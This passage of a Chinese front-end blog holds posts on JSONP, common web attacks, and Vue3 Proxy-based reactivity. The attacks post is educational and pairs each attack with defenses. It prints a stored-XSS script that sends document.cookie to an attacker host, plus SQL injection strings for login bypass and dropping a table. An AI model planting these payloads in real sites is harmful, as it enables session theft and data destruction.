class="string">&#x27;script&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 问题3解决方案：拼接参数字符串，后面将params拼接到url后面</span></span><br><span class="line">  <span class="keyword">let</span> params = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> options.<span class="property">data</span>) &#123;</span><br><span class="line">    params += <span class="string">`&amp;<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;options.data[key]&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 问题2解决方案：随机生成函数名，函数名不能是纯数字，所以在前面加了个myJsonp</span></span><br><span class="line">  <span class="keyword">let</span> fnName = <span class="string">&#x27;myJsonp&#x27;</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 问题1解决方案：给window添加属性，这样虽然全局作用域下没有这个函数，但是window对象下有这个属性</span></span><br><span class="line">  <span class="variable language_">window</span>[fnName] = options.<span class="property">success</span>;</span><br><span class="line"></span><br><span class="line">  script.<span class="property">src</span> = options.<span class="property">url</span> + <span class="string">&#x27;?callback=&#x27;</span> + fnName + params;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">  script.<span class="property">onload</span> = <span class="function">()=&gt;</span>&#123;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(script)&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们访问腾讯天气测试一下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">jsonp</span>(&#123; </span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;https://wis.qq.com/weather/common&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">      <span class="attr">source</span>: <span class="string">&#x27;pc&#x27;</span>,</span><br><span class="line">      <span class="attr">weather_type</span>: <span class="string">&#x27;forecast_24h&#x27;</span>,</span><br><span class="line">      <span class="attr">province</span>: <span class="string">&#x27;陕西省&#x27;</span>,</span><br><span class="line">      <span class="attr">city</span>: <span class="string">&#x27;西安市&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">success</span>(<span class="params">data</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>可以成功获取天气数据：</p>
<img src="1.png">
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/05/31/HTTP012/" data-id="clur520qq001rmoccgzac08rq" data-title="JSONP" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-HTTP011" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/05/26/HTTP011/" class="article-date">
  <time class="dt-published" datetime="2021-05-26T07:40:31.000Z" itemprop="datePublished">2021-05-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/05/26/HTTP011/">常见 Web 攻击总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>常见的 web 攻击有以下几种：</p>
<ul>
<li>XSS（跨站脚本攻击）</li>
<li>CSRF（跨站请求伪造）</li>
<li>SQL 注入</li>
<li>DDOS</li>
</ul>
<h2 id="一、XSS"><a href="#一、XSS" class="headerlink" title="一、XSS"></a>一、XSS</h2><h3 id="什么是-XSS"><a href="#什么是-XSS" class="headerlink" title="什么是 XSS"></a>什么是 XSS</h3><p>XSS （Cross-Site Script）攻击，即跨站脚本攻击，为了不和层叠样式表（Casscading Style Sheets，CSS）的缩写混淆，因此缩写为 XSS。</p>
<p>XSS 攻击涉及到三方：攻击者、用户、web server。用户通过浏览器访问 web server 上的网页，攻击者通过某些办法，在该网页中插入自己的脚本。用户在自己的浏览器上访问该网页时，被插入的脚本被执行，来获取用户的的信息，并发送到攻击者自己的服务器上（跨站了）。因此被称为跨站脚本攻击。</p>
<p>一句话来说，XSS 攻击指<strong>攻击者在网页中嵌入恶意的脚本程序</strong>。XSS 攻击是为了盗取存储在客户端的 cookie 或者其他用于识别客户端身份的敏感信息。一旦获取到合法用户的信息，攻击者就可以假冒合法用户与网站进行交互。</p>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>例如，小明做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是这样是 <code>&lt;script&gt;window.open(&quot;www.gongji.com?params&quot;+document.cookie)&lt;/script&gt;</code> ，如果我没有对它的内容进行处理，直接存储到数据库，那么当下一次其他用户访问他的这篇文章的时候，服务器会从数据库读取这段内容后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的 cookie 发送到攻击者的服务器了。</p>
<h3 id="如何预防-XSS"><a href="#如何预防-XSS" class="headerlink" title="如何预防 XSS"></a>如何预防 XSS</h3><p>XSS 防御的总体思路是：<strong>对输入(和URL参数)进行过滤，对输出进行编码</strong>。也就是对提交的所有内容进行过滤，对 url 中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。</p>
<h3 id="HttpOnly-与-XSS-防御"><a href="#HttpOnly-与-XSS-防御" class="headerlink" title="HttpOnly 与 XSS 防御"></a>HttpOnly 与 XSS 防御</h3><p>XSS 一般利用 js 脚本读取用户浏览器中的 cookie，而如果在服务器端对 cookie 设置了HttpOnly 属性，那么 js 脚本就不能读取到 cookie，但是浏览器还是能够正常使用cookie。</p>
<h2 id="二、CSRF"><a href="#二、CSRF" class="headerlink" title="二、CSRF"></a>二、CSRF</h2><h3 id="什么是-CSRF"><a href="#什么是-CSRF" class="headerlink" title="什么是 CSRF"></a>什么是 CSRF</h3><p>CSRF（Cross-site request forgery），即跨站请求伪造，也被称为 one click attack&#x2F;session riding，缩写为 CSRF&#x2F;XSRF。</p>
<p>可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义发送恶意请求</strong>。CSRF能够做的事情包括：以你名义发送邮件、发消息、盗取你的账号、甚至于购买商品、虚拟货币转账等等，造成的问题包括：个人隐私泄露以及财产安全。</p>
<h3 id="CSRF-攻击的思想"><a href="#CSRF-攻击的思想" class="headerlink" title="CSRF 攻击的思想"></a>CSRF 攻击的思想</h3><img src="1.jpg">

<p>从上图可以看出，要完成一次 CSRF 攻击，受害者必须依次完成两个步骤：</p>
<ol>
<li>登录受信任网站A，并在本地生成 Cookie。</li>
<li>在不退出A的情况下，访问危险网站B。</li>
</ol>
<p>看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</p>
<ol>
<li>你不能保证你登录了一个网站后，不再打开一个页面并访问另外的网站。</li>
<li>你不能保证你关闭浏览器了后，你本地的 Cookie 立刻过期。</li>
<li>上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</li>
</ol>
<h3 id="如何预防-CSRF"><a href="#如何预防-CSRF" class="headerlink" title="如何预防 CSRF"></a>如何预防 CSRF</h3><ul>
<li>攻击者是利用了存储在浏览器的用于用户认证的 cookie，那么不使用 cookie 进行验证就可以预防了，所以我们可以采用 token 认证。</li>
<li>验证 HTTP Referer 字段，HTTP Referer 是请求头的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些信息用于处理。</li>
</ul>
<h2 id="三、SQL-注入"><a href="#三、SQL-注入" class="headerlink" title="三、SQL 注入"></a>三、SQL 注入</h2><h3 id="什么是-SQL-注入"><a href="#什么是-SQL-注入" class="headerlink" title="什么是 SQL 注入"></a>什么是 SQL 注入</h3><p>SQL 注入就是通过<strong>将 sql 命令伪装成 http 请求参数，传递到服务器，服务器执行 sql 命令造成攻击</strong>。</p>
<h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p><code>&#39; or &#39;1&#39;= &#39;1</code> 是最常见的 sql 注入攻击，当输如用户名 xming，密码输入 <code>&#39;or &#39;1&#39;= &#39;1</code> 时，在查询用户名和密码是否正确的时候，本来要执行的是 <code>select * from user where username=&#39;&#39; and password=&#39;&#39;</code>，经过参数拼接后，会执行 sql 语句 <code>select * from user where username=&#39;jaijun&#39; and password=&#39;&#39; or &#39;1&#39;= &#39;1&#39;</code>，此时 1&#x3D;1 是成立的，自然就跳过验证了。</p>
<p>如果再严重一点，密码输入的是 <code>&#39;;drop table user;--</code>，那么 sql 命令为 <code>select * from user where username=&#39;jiajun&#39; and password=&#39;&#39;;drop table user;--&#39;</code>，此就直接把这个表给删除了。</p>
<h3 id="如何预防-SQL-注入"><a href="#如何预防-SQL-注入" class="headerlink" title="如何预防 SQL 注入"></a>如何预防 SQL 注入</h3><ul>
<li>对进入数据库的特殊字符（<code>&#39;&quot;\尖括号&amp;*</code>;等）进行转义处理。</li>
<li>在应用发布之前建议使用专业的 SQL 注入检测工具进行检测，以及时修补被发现的SQL 注入漏洞。</li>
<li>避免网站打印出 SQL 错误信息，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露出来，以防止攻击者利用这些错误信息进行 SQL 注入。</li>
</ul>
<h2 id="四、DDOS"><a href="#四、DDOS" class="headerlink" title="四、DDOS"></a>四、DDOS</h2><h3 id="什么是-DDOS"><a href="#什么是-DDOS" class="headerlink" title="什么是 DDOS"></a>什么是 DDOS</h3><p>DDOS（Distributed Denial of Service）攻击 ，即分布式拒绝服务攻击。简单的说就是<strong>发送大量请求使服务器瘫痪</strong>。DDOS 攻击是在 DOS 攻击基础上的，可以通俗理解，DOS 是单挑，而 DDOS 是群殴。因为现代技术的发展，DOS 攻击的杀伤力降低，所以出现了 DDOS，攻击者借助公共网络，将大数量的计算机设备联合起来，向一个或多个目标进行攻击。   </p>
<p>在技术角度上，DDoS 攻击可以针对网络通讯协议的各层，手段大致有：TCP 类的 SYN Flood、ACK Flood，UDP 类的 Fraggle、Trinoo，DNS Query Flood，ICMP Flood，Slowloris 类等等。一般会根据攻击目标的情况，针对性的把技术手法混合，以达到最低成本最难防御的目的，并且可以进行合理的节奏控制，以及隐藏保护攻击资源。</p>
<p>下面介绍一下TCP协议中的SYN攻击。</p>
<h3 id="SYN-攻击"><a href="#SYN-攻击" class="headerlink" title="SYN 攻击"></a>SYN 攻击</h3><p>在三次握手过程中，服务器发送 <code>SYN-ACK</code> 之后，在收到客户端的 <code>ACK</code> 之前的 TCP 连接称为半连接（half-open connect）。此时服务器处于 <code>SYN_RCVD</code> 状态。当收到 <code>ACK</code> 之后，服务器才能转入 <code>ESTABLISHED</code> 状态.</p>
<p>SYN 攻击指的是，攻击客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 <code>SYN</code> 包，服务器回复确认包，并等待客户端的确认。由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 <code>SYN</code> 包将长时间占用未连接队列，导致正常的 <code>SYN</code> 包请求被丢弃，目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。</p>
<h3 id="如何预防-DDOS"><a href="#如何预防-DDOS" class="headerlink" title="如何预防 DDOS"></a>如何预防 DDOS</h3><ul>
<li>最直接的方法是增加带宽。但是攻击者用各地的电脑进行攻击，他的带宽不会耗费很多钱，但对于服务器来说，带宽非常昂贵。</li>
<li>阿里巴巴的安全团队在实战中发现，DDoS 防御产品的核心是检测技术和清洗技术。检测技术就是检测网站是否正在遭受 DDoS 攻击，而清洗技术就是清洗掉异常流量。而检测技术的核心在于对业务深刻的理解，才能快速精确判断出是否真的发生了 DDoS 攻击。清洗技术对于检测技术来讲，不同的业务场景下要求的粒度不一样。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/05/26/HTTP011/" data-id="clur520qp001nmocc8mkfhojw" data-title="常见 Web 攻击总结" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Vue007" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/05/17/Vue007/" class="article-date">
  <time class="dt-published" datetime="2021-05-17T09:42:28.000Z" itemprop="datePublished">2021-05-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/05/17/Vue007/">【Vue3.x】Vue3响应式原理</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="我们首先回顾一下-Vue2-中-Object-defineProperty-的缺点："><a href="#我们首先回顾一下-Vue2-中-Object-defineProperty-的缺点：" class="headerlink" title="我们首先回顾一下 Vue2 中 Object.defineProperty 的缺点："></a>我们首先回顾一下 Vue2 中 <code>Object.defineProperty</code> 的缺点：</h4><ol>
<li>深度监听，需要一次性递归到底（关键在于一次性，如果数据层级很深的话，一次性递归到底很耗时）</li>
<li>无法监听新增属性、删除属性（所以有 Vue.set、Vue.delete）</li>
<li>无法原生监听数组，需要特殊处理</li>
</ol>
<h4 id="Vue3-响应式："><a href="#Vue3-响应式：" class="headerlink" title="Vue3 响应式："></a>Vue3 响应式：</h4><p>Vue3 使用 Proxy 实现响应式，可以监听新增属性与删除属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 响应式函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reactive</span>(<span class="params">target</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> target !== <span class="string">&#x27;object&#x27;</span> || target == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 不是对象或数组，则返回</span></span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 代理配置</span></span><br><span class="line">  <span class="keyword">const</span> proxyConf = &#123;</span><br><span class="line">    <span class="comment">// target就是obj，receiver就是proxyData</span></span><br><span class="line">    <span class="title function_">get</span>(<span class="params">target, key, receiver</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, key, receiver);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get&#x27;</span>, key);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// set不仅可以监听到设置属性，也可以监听到新增属性</span></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">target, key, val, receiver</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, key, val, receiver);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;set&#x27;</span>, key, val);</span><br><span class="line">      <span class="keyword">return</span> result; <span class="comment">// 是否设置成功</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 可以监听到删除属性</span></span><br><span class="line">    <span class="title function_">deleteProperty</span>(<span class="params">target, key</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">deleteProperty</span>(target, key);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;delete property&#x27;</span>, key);</span><br><span class="line">      <span class="keyword">return</span> result; <span class="comment">// 是否删除成功</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成代理对象</span></span><br><span class="line">  <span class="keyword">const</span> observed = <span class="keyword">new</span> <span class="title class_">Proxy</span>(target, proxyConf)</span><br><span class="line">  <span class="keyword">return</span> observed</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试数据</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lily&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxyData = <span class="title function_">reactive</span>(obj)</span><br></pre></td></tr></table></figure>

<p>测试一下，已经实现了对象的监听读取属性、修改属性、新增属性、删除属性。</p>
<img src="1.png" width="35%">

<p>我们再测试一下对数组的监听：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">const</span> proxyData2 = <span class="title function_">reactive</span>(arr)</span><br></pre></td></tr></table></figure>

<img src="2.png" width="65%">

<p>我们可以直接监听数组。但是发现了另外2个问题：① 我们不应该监听原型属性；② 如果是重复的数据应该不处理。</p>
<h4 id="改进以上问题："><a href="#改进以上问题：" class="headerlink" title="改进以上问题："></a>改进以上问题：</h4><p>因此我们做如下改进：</p>
<img src="3.png"  width="75%">

<p>我们再测试一下：</p>
<img src="4.png"  width="35%">

<p>现在就可以对数组和对象进行基础的监听了。但是我们还有2个问题没有解决：① 如何实现深度监听；② 如何区分是新增属性还是修改属性。</p>
<h4 id="实现深度监听："><a href="#实现深度监听：" class="headerlink" title="实现深度监听："></a>实现深度监听：</h4><p>测试数据：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lily&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">info</span>: &#123;</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&#x27;xian&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="5.png">

<p>它值输出了 get info 而并没有输出 get city，说明并没有监听到 city 属性，也就是未实现深度监听。因为我们做如下修改：</p>
<img src="6.png" width="75%">

<p>再测试一下，实现了深度监听：</p>
<img src="7.png" width="35%">

<p>Vue2 的 <code>Object.defineProperty</code> 也可以实现深度监听，那 Vue3 的 <code>proxy</code> 的优点在哪呢？Vue2 的 <code>Object.defineProperty</code> 实现深度监听时，会一次性递归到底，计算量大！而  Vue3 的 <code>proxy</code> 是在 get 中实现递归，也就是什么时候 get 什么时候往下一层递归。 Vue3 的 <code>proxy</code> 本质就是你获取到哪一层，哪一层才会触发响应式，并非一次性递归到底，性能得到很大提升。我们看测试就能看出这一点：</p>
<p>测试用例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lily&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">info</span>: &#123;</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&#x27;xian&#x27;</span>,</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">      <span class="attr">b</span>: &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="attr">c</span>: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxyData = <span class="title function_">reactive</span>(obj)</span><br></pre></td></tr></table></figure>

<img src="8.png"   width="50%">

<h4 id="如何判断是新增属性还是修改属性："><a href="#如何判断是新增属性还是修改属性：" class="headerlink" title="如何判断是新增属性还是修改属性："></a>如何判断是新增属性还是修改属性：</h4><p>只需做如下修改：</p>
<img src="9.png" width="75%">

<p>测试：</p>
<img src="10.png" width="35%">

<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p><code>proxy</code> 可以规避 <code>Object.defineProperty</code> 的问题：</p>
<ul>
<li>深度监听的性能更好</li>
<li>可以监听新增属性、删除属性</li>
<li>可以监听数组变化</li>
</ul>
<p>但是 <code>proxy</code> 目前无法兼容所有浏览器，也无法 polyfill。</p>
<h4 id="完整代码："><a href="#完整代码：" class="headerlink" title="完整代码："></a>完整代码：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 响应式函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reactive</span>(<span class="params">target</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> target !== <span class="string">&#x27;object&#x27;</span> || <span class="keyword">typeof</span> target == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 不是对象或数组，则返回</span></span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 代理配置</span></span><br><span class="line">  <span class="keyword">const</span> proxyConf = &#123;</span><br><span class="line">    <span class="comment">// target就是obj，receiver就是proxyData</span></span><br><span class="line">    <span class="title function_">get</span>(<span class="params">target, key, receiver</span>) &#123;</span><br><span class="line">      <span class="comment">// 只处理本身属性，不处理原型属性</span></span><br><span class="line">      <span class="keyword">const</span> ownKeys = <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(target);</span><br><span class="line">      <span class="keyword">if</span>(ownKeys.<span class="title function_">includes</span>(key)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get&#x27;</span>, key);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, key, receiver);</span><br><span class="line">      <span class="comment">// 深度监听</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">reactive</span>(result);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// set不仅可以监听到设置属性，也可以监听到新增属性</span></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">target, key, val, receiver</span>) &#123;</span><br><span class="line">      <span class="comment">// 重复的数据不处理</span></span><br><span class="line">      <span class="keyword">const</span> oldVal = target[key];</span><br><span class="line">      <span class="keyword">if</span> (val === oldVal) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如何判断是新增属性还是修改属性</span></span><br><span class="line">      <span class="keyword">const</span> ownKeys = <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(target);</span><br><span class="line">      <span class="keyword">if</span>(ownKeys.<span class="title function_">includes</span>(key)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;已有的key&#x27;</span>, key);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;新增的key&#x27;</span>, key);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, key, val, receiver);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;set&#x27;</span>, key, val);</span><br><span class="line">      <span class="keyword">return</span> result; <span class="comment">// 是否设置成功</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 可以监听到删除属性</span></span><br><span class="line">    <span class="title function_">deleteProperty</span>(<span class="params">target, key</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">deleteProperty</span>(target, key);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;delete property&#x27;</span>, key);</span><br><span class="line">      <span class="keyword">return</span> result; <span class="comment">// 是否删除成功</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成代理对象</span></span><br><span class="line">  <span class="keyword">const</span> observed = <span class="keyword">new</span> <span class="title class_">Proxy</span>(target, proxyConf);</span><br><span class="line">  <span class="keyword">return</span> observed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试数据</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lily&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">info</span>: &#123;</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&#x27;xian&#x27;</span>,</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">      <span class="attr">b</span>: &#123;</span><br><span class="line">        <span class="attr">c</span>: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">const</span> proxyData = <span class="title function_">reactive</span>(obj);</span><br><span class="line"><span class="keyword">const</span> proxyData1 = <span class="title function_">reactive</span>(arr);</span><br></pre></td></tr></table></figure>


      
    </div>
